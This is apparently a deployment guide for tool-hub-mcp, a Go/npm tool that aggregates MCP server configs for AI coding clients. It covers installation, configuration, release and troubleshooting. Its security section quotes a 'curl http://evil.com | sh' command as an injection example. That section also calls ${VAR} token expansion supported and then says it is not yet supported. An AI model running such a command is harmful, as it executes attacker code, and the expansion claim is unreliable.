# tool-hub-mcp: Deployment Guide

**Version:** 1.0.1
**Last Updated:** 2026-01-21
**Status:** Production Ready

## Overview

tool-hub-mcp is distributed as a zero-install npm package and Go binary. This guide covers installation, configuration, and deployment workflows for production use.

## Distribution Methods

### Method 1: Zero-Install npm (Recommended)

**Package:** `@khanglvm/tool-hub-mcp`

**Platforms Supported:**
- macOS Apple Silicon (darwin-arm64)
- macOS Intel (darwin-x64)
- Linux x64 (linux-x64)
- Linux ARM64 (linux-arm64)
- Windows x64 (win32-x64)

**Installation:**
```bash
# Zero-install (no npm install needed)
npx @khanglvm/tool-hub-mcp setup

# With bun
bunx @khanglvm/tool-hub-mcp setup

# With pnpm
pnpm dlx @khanglvm/tool-hub-mcp setup

# With yarn
yarn dlx @khanglvm/tool-hub-mcp setup
```

**How It Works:**
1. npm automatically installs matching platform package from `optionalDependencies`
2. `cli.js` detects platform and spawns Go binary
3. Fallback: Downloads from GitHub Releases if optionalDependencies disabled

**Advantages:**
- No installation step
- Always latest version
- Cross-platform compatibility
- Works with npx, bunx, pnpm dlx, yarn dlx

### Method 2: Go Install

**Installation:**
```bash
go install github.com/khanglvm/tool-hub-mcp/cmd/tool-hub-mcp@latest
```

**Binary Location:**
- macOS/Linux: `~/go/bin/tool-hub-mcp`
- Windows: `%USERPROFILE%\go\bin\tool-hub-mcp.exe`

**PATH Setup:**
```bash
# Add to ~/.zshrc or ~/.bashrc
export PATH=$PATH:~/go/bin

# Verify
which tool-hub-mcp
tool-hub-mcp --version
```

**Advantages:**
- No npm dependency
- Always latest from main branch
- Familiar for Go developers

### Method 3: Direct Binary Download

**Release Page:** https://github.com/khanglvm/tool-hub-mcp/releases

**Platforms:**
```
tool-hub-mcp-Darwin-arm64         # macOS Apple Silicon
tool-hub-mcp-Darwin-x86_64        # macOS Intel
tool-hub-mcp-Linux-arm64          # Linux ARM64
tool-hub-mcp-Linux-x86_64         # Linux x64
tool-hub-mcp-Windows-x86_64.exe   # Windows x64
```

**Installation:**
```bash
# Download
curl -L https://github.com/khanglvm/tool-hub-mcp/releases/latest/download/tool-hub-mcp-Darwin-arm64 -o tool-hub-mcp

# Make executable
chmod +x tool-hub-mcp

# Move to PATH
sudo mv tool-hub-mcp /usr/local/bin/
```

## Initial Setup

### Step 1: Import Existing MCP Configs

**Auto-Import from AI Tools:**
```bash
tool-hub-mcp setup
```

**What It Does:**
- Scans for config files from:
  - Claude Code (`~/.claude.json`, `.mcp.json`)
  - OpenCode (`~/.opencode.json`)
  - Google Antigravity (`~/.gemini/antigravity/mcp_config.json`)
  - Gemini CLI (`~/.gemini/settings.json`)
  - Cursor (`~/.cursor/mcp.json`)
  - Windsurf (`~/.codeium/windsurf/mcp_config.json`)
- Transforms server names to camelCase
- Merges all configs into `~/.tool-hub-mcp.json`

**Non-Interactive Mode:**
```bash
tool-hub-mcp setup --yes
```

### Step 2: Verify Configuration

```bash
tool-hub-mcp verify
```

**Expected Output:**
```
✓ Config file exists: /Users/you/.tool-hub-mcp.json
✓ Valid JSON structure
✓ 6 servers configured
✓ All servers have commands defined
```

### Step 3: Review Registered Servers

```bash
tool-hub-mcp list
```

**Example Output:**
```
Registered Servers (6):

chromeDevtools
  Command: npx -y @modelcontextprotocol/server-puppeteer
  Source: claude-code
  Environment Variables: 0

figma
  Command: npx -y @modelcontextprotocol/server-figma
  Source: claude-code
  Environment Variables: 1

jira
  Command: npx -y @lvmk/jira-mcp
  Source: claude-code
  Environment Variables: 2
  ...
```

## AI Client Configuration

### Claude Code

**Add tool-hub-mcp:**
```bash
claude mcp add -s user tool-hub -- npx -y @khanglvm/tool-hub-mcp serve
```

**Verify:**
```bash
claude mcp list
# Output should show:
# tool-hub: npx -y @khanglvm/tool-hub-mcp serve
```

**Config File:** `~/.claude.json`

```json
{
  "mcpServers": {
    "tool-hub": {
      "command": "npx",
      "args": ["-y", "@khanglvm/tool-hub-mcp", "serve"]
    }
  }
}
```

**Important:** Use `-s user` for user-scope config (recommended). Avoid project-scope (`.mcp.json`) unless project-specific.

### OpenCode

**Add tool-hub-mcp:**
```bash
# Edit ~/.opencode.json
```

**Config Format:**
```json
{
  "mcp": {
    "tool-hub": {
      "type": "local",
      "command": "npx",
      "args": ["-y", "@khanglvm/tool-hub-mcp", "serve"],
      "enabled": true
    }
  }
}
```

### Cursor

**Add tool-hub-mcp:**
```bash
# Edit ~/.cursor/mcp.json
```

**Config Format:** Same as Claude Code (uses `mcpServers` key)

### Windsurf

**Add tool-hub-mcp:**
```bash
# Edit ~/.codeium/windsurf/mcp_config.json
```

**Config Format:** Same as Claude Code

## Manual Server Management

### Add Server (JSON Paste)

**Interactive Mode:**
```bash
tool-hub-mcp add
# Paste JSON
# Confirm preview
```

**Example JSON:**
```json
{
  "mcpServers": {
    "jira": {
      "command": "npx",
      "args": ["-y", "@lvmk/jira-mcp"],
      "env": {
        "JIRA_URL": "https://your-domain.atlassian.net",
        "JIRA_EMAIL": "your-email@example.com",
        "JIRA_TOKEN": "your-api-token"
      }
    }
  }
}
```

### Add Server (Flags)

**Command Format:**
```bash
tool-hub-mcp add <server-name> --command <cmd> --arg <arg> --arg <arg> --env KEY=VALUE
```

**Example:**
```bash
tool-hub-mcp add jira \
  --command npx \
  --arg -y \
  --arg @lvmk/jira-mcp \
  --env JIRA_URL=https://your-domain.atlassian.net \
  --env JIRA_EMAIL=your-email@example.com \
  --env JIRA_TOKEN=your-api-token
```

**Short Flags:**
```bash
tool-hub-mcp add jira -c npx -a -y -a @lvmk/jira-mcp -e JIRA_URL=...
```

### Remove Server

```bash
tool-hub-mcp remove jira
# Or using camelCase
tool-hub-mcp remove jiraMcp
```

### List Servers

```bash
tool-hub-mcp list

# JSON output
tool-hub-mcp list --json
```

## Configuration File

### Location

**Path:** `~/.tool-hub-mcp.json`

**Format:**
```json
{
  "servers": {
    "serverName": {
      "command": "npx",
      "args": ["-y", "@package/name"],
      "env": {
        "KEY": "value"
      },
      "source": "claude-code",
      "metadata": {
        "description": "Optional server description",
        "tools": ["tool1", "tool2"],
        "lastUpdated": "2026-01-21T12:00:00Z"
      }
    }
  },
  "settings": {
    "cacheToolMetadata": true,
    "processPoolSize": 3,
    "timeoutSeconds": 30
  }
}
```

### Settings

| Setting | Type | Default | Description |
|---------|------|---------|-------------|
| `cacheToolMetadata` | boolean | `true` | Cache tool definitions in config |
| `processPoolSize` | integer | `3` | Max concurrent child processes |
| `timeoutSeconds` | integer | `30` | Timeout for MCP requests |

**Example Customization:**
```json
{
  "settings": {
    "cacheToolMetadata": false,
    "processPoolSize": 5,
    "timeoutSeconds": 60
  }
}
```

## Running the MCP Server

### Development Mode

**Direct Execution:**
```bash
tool-hub-mcp serve
```

**What It Does:**
- Loads config from `~/.tool-hub-mcp.json`
- Creates process pool (default size: 3)
- Starts stdio event loop
- Exposes 5 meta-tools
- Blocks until stdin closed

**Use Case:** Manual testing, debugging

### Production Mode (Via AI Client)

**Claude Code:**
```bash
# Already configured via:
claude mcp add -s user tool-hub -- npx -y @khanglvm/tool-hub-mcp serve

# Server auto-starts when Claude Code needs tools
```

**Background Process:**
```bash
# Start server in background
tool-hub-mcp serve &

# Or with nohup (persistent after logout)
nohup tool-hub-mcp serve > tool-hub.log 2>&1 &
```

**systemd Service (Linux):**
```ini
# /etc/systemd/system/tool-hub-mcp.service
[Unit]
Description=tool-hub-mcp MCP Server
After=network.target

[Service]
Type=simple
User=your-user
ExecStart=/usr/local/bin/tool-hub-mcp serve
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
```

**Enable Service:**
```bash
sudo systemctl enable tool-hub-mcp
sudo systemctl start tool-hub-mcp
sudo systemctl status tool-hub-mcp
```

## Performance Benchmarking

### Token Consumption Analysis

```bash
tool-hub-mcp benchmark
```

**Example Output:**
```
╔══════════════════════════════════════════════════════════════╗
║           TOKEN EFFICIENCY BENCHMARK RESULTS                 ║
╠══════════════════════════════════════════════════════════════╣
║  📊 TRADITIONAL MCP SETUP                                    ║
║     Servers: 6                                               ║
║     Tools:   ~120 (estimated)                                ║
║     Tokens:  ~18000                                          ║
║  🚀 TOOL-HUB-MCP SETUP                                       ║
║     Servers: 1                                               ║
║     Tools:   5 (meta-tools)                                  ║
║     Tokens:  ~750                                            ║
║  💰 SAVINGS                                                  ║
║     Tokens saved: ~17250                                     ║
║     Reduction:    95.8%                                      ║
╚══════════════════════════════════════════════════════════════╝
```

**JSON Output:**
```bash
tool-hub-mcp benchmark --json
```

### Speed Benchmarking

```bash
tool-hub-mcp benchmark speed
```

**Measures:**
- Time to spawn child MCP process
- Time to send tools/list request
- Time to receive and parse response
- Average latency per server

**Custom Iterations:**
```bash
tool-hub-mcp benchmark speed --iterations 10
```

**Example Output:**
```
Speed Benchmark Results (3 iterations):

chromeDevtools: 498ms avg
figma: 381ms avg
jira: 317ms avg
playwright: 295ms avg
mcp-outline: 244ms avg

Overall: 307ms average
```

## Release & Publish Workflow

### Automated Release (GitHub Actions)

**Trigger:** Push git tag matching `v*`

**Workflow:**
```bash
# 1. Update version in package.json files
npm version 1.0.2

# 2. Commit changes
git add .
git commit -m "chore: bump version to 1.0.2"

# 3. Create tag
git tag v1.0.2

# 4. Push tag (triggers GitHub Actions)
git push --tags
```

**What Happens Automatically:**
1. Build Go binaries for 5 platforms
2. Create GitHub Release with binaries
3. Publish 5 platform npm packages
4. Publish main npm package

**Prerequisites:**
- GitHub Secret: `NPM_TOKEN` (npm automation token)
- GitHub Secret: `GITHUB_TOKEN` (auto-provided)

### Manual Publish (Local)

**Script:** `scripts/publish-npm.sh`

**Usage:**
```bash
# Bump version (patch, minor, major)
./scripts/publish-npm.sh patch
./scripts/publish-npm.sh 1.0.2

# Or just use npm version
npm version patch
./scripts/publish-npm.sh
```

**What It Does:**
1. Check npm login (`npm whoami`)
2. Build Go binaries for 5 platforms
3. Sync version across all 6 packages
4. Publish platform packages
5. Publish main package

**Prerequisites:**
- npm login (npm account with @khanglvm org access)
- Go 1.22+ installed

## Troubleshooting

### Common Issues

#### Issue: "command not found: tool-hub-mcp"

**Cause:** Binary not in PATH

**Solution:**
```bash
# Check if binary exists
which tool-hub-mcp

# If not found, reinstall
go install github.com/khanglvm/tool-hub-mcp/cmd/tool-hub-mcp@latest

# Or use npx
npx @khanglvm/tool-hub-mcp --version
```

#### Issue: "Config file not found"

**Cause:** Initial setup not run

**Solution:**
```bash
tool-hub-mcp setup
```

#### Issue: "Server timeout during spawn"

**Cause:** npx downloading package on cold start

**Solution:**
- Increase timeout in settings:
  ```json
  {
    "settings": {
      "timeoutSeconds": 60
    }
  }
  ```
- Or pre-warm servers:
  ```bash
  tool-hub-mcp benchmark speed  # Spawns all servers
  ```

#### Issue: "JavaScript MCP server times out"

**Cause:** Request ID exceeds MAX_SAFE_INTEGER

**Solution:** This is fixed in current version (v1.0.1+). Ensure you're using latest:
```bash
npx @khanglvm/tool-hub-mcp@latest --version
```

#### Issue: "Stderr pipe deadlock"

**Cause:** MCP server writing to stderr

**Solution:** This is fixed in current version (v1.0.1+). Ensure you're using latest.

#### Issue: "npm package not found"

**Cause:** Package not published or wrong scope

**Solution:**
```bash
# Check if package exists
npm view @khanglvm/tool-hub-mcp

# If not found, use Go install instead
go install github.com/khanglvm/tool-hub-mcp/cmd/tool-hub-mcp@latest
```

### Debug Mode

**Enable Logging:**
```bash
# Run with verbose output (future feature)
tool-hub-mcp serve --verbose

# For now, check stderr
tool-hub-mcp serve 2>&1 | tee server.log
```

**Check Process Pool:**
```bash
# List running tool-hub-mcp processes
ps aux | grep tool-hub-mcp

# Check child MCP processes
ps aux | grep npx
```

**Validate Config:**
```bash
tool-hub-mcp verify

# Manual JSON check
cat ~/.tool-hub-mcp.json | jq .
```

## Security Considerations

### API Tokens in Config

**Bad:** Hardcode tokens in config
```json
{
  "env": {
    "JIRA_TOKEN": "your-api-token-here"  // Visible in plaintext
  }
}
```

**Good:** Use environment variables
```bash
# Export in shell
export JIRA_TOKEN="your-api-token-here"

# Reference in config
{
  "env": {
    "JIRA_TOKEN": "${JIRA_TOKEN}"  // tool-hub-mcp expands ${VAR}
  }
}
```

**Note:** Current version requires token in config. Future enhancement: `${VAR}` expansion.

### File Permissions

**Config File:**
```bash
# Restrict to owner only
chmod 600 ~/.tool-hub-mcp.json
```

**Binary:**
```bash
# Verify executable
ls -la $(which tool-hub-mcp)

# Should show: -rwxr-xr-x
```

### Command Injection Prevention

**tool-hub-mcp uses safe spawning:**
```go
cmd := exec.Command(cfg.Command, cfg.Args...)
// No shell interpolation → injection safe
```

**Never use:**
```bash
# Vulnerable to injection
tool-hub-mcp add malicious --command "curl http://evil.com | sh"
```

## Updates & Upgrades

### Check Current Version

```bash
tool-hub-mcp --version
```

**Output:** `tool-hub-mcp version 1.0.1 (commit: abc123, built: 2026-01-21)`

### Update npm Package

```bash
# npx always uses latest
npx @khanglvm/tool-hub-mcp@latest setup

# Or if installed globally
npm update -g @khanglvm/tool-hub-mcp
```

### Update Go Binary

```bash
go install github.com/khanglvm/tool-hub-mcp/cmd/tool-hub-mcp@latest
```

### Update Config Format

**Config changes are backward compatible.**

**If new settings added:**
```bash
# Edit ~/.tool-hub-mcp.json
# Add new settings with defaults
```

**Migration:**
```bash
# Re-run setup to merge latest configs
tool-hub-mcp setup --yes
```

## Monitoring & Maintenance

### Health Checks

```bash
# Verify configuration
tool-hub-mcp verify

# List servers
tool-hub-mcp list

# Benchmark performance
tool-hub-mcp benchmark
tool-hub-mcp benchmark speed
```

### Log Management

**If running as background process:**
```bash
# Redirect to file
tool-hub-mcp serve > tool-hub.log 2>&1 &

# Rotate logs
logrotate /etc/logrotate.d/tool-hub-mcp
```

### Process Management

**Check if running:**
```bash
ps aux | grep "tool-hub-mcp serve"
```

**Stop all instances:**
```bash
pkill -f "tool-hub-mcp serve"
```

## References

- **npm Package:** https://www.npmjs.com/package/@khanglvm/tool-hub-mcp
- **GitHub Releases:** https://github.com/khanglvm/tool-hub-mcp/releases
- **MCP Protocol:** https://modelcontextprotocol.io/
- **Claude Code:** https://claude.ai/code
- **Project README:** `/README.md`

---

**Owner:** Development Team
**Review Cycle:** As needed
**Next Review:** Post v1.1.0 release
